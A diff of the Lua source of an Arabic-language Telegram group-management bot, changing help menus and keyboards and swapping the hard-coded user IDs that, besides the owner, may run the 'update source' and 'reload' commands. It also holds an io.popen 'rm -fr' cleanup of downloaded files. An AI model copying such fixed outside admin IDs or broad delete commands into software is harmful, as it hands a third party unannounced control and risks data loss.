-	🎈╽❬ طلاك ❭ «» ❬ زواج ❭
-	┄─┅═ـ═┅─┄
-	  ]]
+	• تفعيل
+• تعطيل
+• اسم بوتك + غادر
+• مسح الادمنيه
+• مسح المميزين
+• مسح المدراء
+• مسح المطورين
+• مسح المنشئين
+• مسح المنشئين الاساسيين
+• مسح كلايش التعليمات
+• اذاعه
+• اذاعه خاص
+• اذاعه عام
+• اذاعه بالتثبيت
+• اذاعه عام بالتوجيه
+• تعيين قائمه الاوامر
+• مسح كلايش التعليمات
+• تعيين كليشه ستارت
+• تعيين ايدي عام
+• مسح ايدي عام
+• تفعيل / تعطيل تعيين الايدي
+• تحديث
+• تحديث السورس ]]
 	  keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '🔙 ...', callback_data="/help@"..data.sender_user_id_}},
+{{text = '⏪', callback_data="/help@"..data.sender_user_id_}},
 
 }
 	  return https.request(ApiToken..'/editMessageText?chat_id='..ChatID..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -803,22 +828,17 @@ keyboard.inline_keyboard = {
 	  local users = datab:match('/help6@(.*)')
 	  if tonumber(users) == tonumber(data.sender_user_id_) then
 	  local Teext = [[ 
-	┄─┅══┅─┄     
-👨‍💻↫ آوآمر آلتعطيل و آلتفعيل
-┄─┅═ـ═┅─┄
-👥╿تفعيل «» تعطيل  ❬ الرفــع ❭
-🗣│تفعيل «» تعطيل  ❬ الردود ❭
-🕹│تفعيل «» تعطيل  ❬الالعـاب❭
-📢│تفعيل «» تعطيل  ❬ التحذير ❭
-👋│تفعيل «» تعطيل  ❬ الترحيب ❭
-🆔│تفعيل «» تعطيل  ❬ الايدي ❭
-🌅╽تفعيل «» تعطيل  ❬ الايدي بالصوره ❭
-┄─┅═ـ═┅─┄
-
-	  ]]
+	•  جميع اوامر الردود 
+• الردود : لعرض الردود المثبته
+•  اضف رد : لأضافه رد جديد
+• مسح رد  الرد المراد مسحه
+• مسح الردود : لمسح كل الردود
+•  اضف رد عام : لاضافه رد لكل المجموعات
+•  مسح رد عام : لمسح الرد العام 
+• مسح الردود العامه : لمسح كل ردود العامه ]]
 	  keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '🔙 ...', callback_data="/help@"..data.sender_user_id_}},
+{{text = '⏪', callback_data="/help@"..data.sender_user_id_}},
 
 }
 	  return https.request(ApiToken..'/editMessageText?chat_id='..ChatID..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -829,21 +849,17 @@ keyboard.inline_keyboard = {
 	  local users = datab:match('/help7@(.*)')
 	  if tonumber(users) == tonumber(data.sender_user_id_) then
 	  local Teext = [[ 
-	┄─┅══┅─┄
-👨‍💻↫ آوآمر ❬ اوامر الوضع للمجموعه ❭
-┄─┅═ـ═┅─┄
-🔗╿ضع رابـط «» لوضع ❬ رابط ❭
-💳│ضع اســـم «» لوضع ❬ اســم ❭
-🏞│ضع صوره «» لوضع ❬ صوره ❭
-📡│ضع وصـف «» لوضع ❬ وصف ❭ 
-🧾│ضع القوانيــن «» لوضع ❬ القوانين ❭ 
-👋│ضع الترحيب «» لوضع ❬ ترحيــب ❭
-💫╽ضع تكرار + العدد «» لوضع ❬ تكرار ❭
-┄─┅═ـ═┅─┄
+	    • آوآمر آلملفآت
+    
+    •  `/files`  لعرض قائمه الملفات 
+    •  `/store`  لعرض متجر الملفات 
+    •  `sp file.lua`   تثبيت الملف 
+    •  `dp file.lua`  الملف المراد حذفه 
+    🌐︙قناة السورس ← @jjxxh
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '🔙 ...', callback_data="/help@"..data.sender_user_id_}},
+{{text = '⏪', callback_data="/help@"..data.sender_user_id_}},
 
 }
 return https.request(ApiToken..'/editMessageText?chat_id='..ChatID..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -854,24 +870,24 @@ return https.request(ApiToken..'/editMessageText?chat_id='..ChatID..'&text='..UR
 	  local users = datab:match('/help@(.*)')
 	  if tonumber(users) == tonumber(data.sender_user_id_) then
 	  local Teext = [[	‌‌‏‌‌‏‌‌‌‌‏                                    
-										 ‌‌‏┄─┅══┅─┄
-	👨‍💻↫‌‌‏مـسـآرت آلآوآمـر آلعآمـهہ‌‏ ⇊
-	┄─┅═ـ═┅─┄
-	👨‍⚖️╿م1 » آوآمـر آلآدآرهہ‌‏
-	📟│م2 » آوآمـر آعدآدآت آلمـجمـوعهہ‌‏
-	🛡│م3 » آوآمـر آلحمـآيهہ‌‏
-	🔰│م4 » آوآمر آلخدمه 
-	  ]]
+• 1 - لعرض اوامر الاداره
+• 2 - لعرض اوامر اعدادات المجموعه
+• 3 - لعرض اوامر الحماية
+• 4 - لعرض اوامر التسليه
+• 5 -اوامر المطور
+• 6 - اوامر الرد
+• 7 - اوامر الملفات 
+]]
 	  keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '⓵', callback_data="/help1@"..data.sender_user_id_},{text = '⓶', callback_data="/help2@"..data.sender_user_id_},{text = '⓷', callback_data="/help3@"..data.sender_user_id_},
+{text = '𝟙', callback_data="/help1@"..data.sender_user_id_},{text = '𝟚', callback_data="/help2@"..data.sender_user_id_},{text = '𝟛', callback_data="/help3@"..data.sender_user_id_},
 },
 {
-{text = '⓸', callback_data="/help4@"..data.sender_user_id_},{text = '⓹', callback_data="/help5@"..data.sender_user_id_},
+{text = '𝟜', callback_data="/help4@"..data.sender_user_id_},{text = '𝟝', callback_data="/help5@"..data.sender_user_id_},
 },
 {
-{text = '⓺', callback_data="/help6@"..data.sender_user_id_},{text = '⓻', callback_data="/help7@"..data.sender_user_id_},
+{text = '𝟞', callback_data="/help6@"..data.sender_user_id_},{text = '𝟟', callback_data="/help7@"..data.sender_user_id_},
 },
 }
 	  
@@ -916,20 +932,20 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 ) then
 return sendMsg(msg.chat_id_,msg.id_,"🗂¦ تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 ) then
 UpdateSource(msg)
-sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
+sendMsg(msg.chat_id_,msg.id_,'| {* تــم تحديث وتثبيت السورس  *} .\n\n| { Bot is Update » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
-sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم أعـاده تشغيل البوت  *} 📡.\n\n👨🏼‍💼| { Bot is Reloaded » }👍🏿',function(arg,data)
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 656329268 ) then
+sendMsg(msg.chat_id_,msg.id_,'| {* تــم أعـاده تشغيل البوت  *} .\n\n| { Bot is Reloaded » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end)
@@ -947,7 +963,7 @@ if data.channel_.status_.ID == "ChatMemberStatusKicked" then
 if redis:get(boss..'group:add-100'..data.channel_.id_) then
 local linkGroup = (redis:get(boss..'linkGroup-100'..data.channel_.id_) or "")
 local NameGroup = (redis:get(boss..'group:name-100'..data.channel_.id_) or "")
-send_msg(SUDO_ID,"📛| قام شخص بطرد البوت من المجموعه الاتيه : \n🏷| ألايدي : `-100"..data.channel_.id_.."`\n🗯| الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n📮| تـم مسح كل بيانات المجموعه بنـجاح ")
+send_msg(SUDO_ID,"| قام شخص بطرد البوت من المجموعه الاتيه : \n| ألايدي : `-100"..data.channel_.id_.."`\n| الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n| تـم مسح كل بيانات المجموعه بنـجاح ")
 rem_data_group('-100'..data.channel_.id_)
 end
 end
@@ -996,7 +1012,7 @@ end
 end
 end
 io.popen("rm -fr ../.telegram-cli/data/document/*")
-sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'📦*¦* تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n⚖️*¦* حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(boss..'group:ids')..'* 🌿\n✓')
+sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,' تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(boss..'group:ids')..'* \n')
 end
 elseif data.ID == "UpdateUser" then  
 if data.user_.type_.ID == "UserTypeDeleted" then
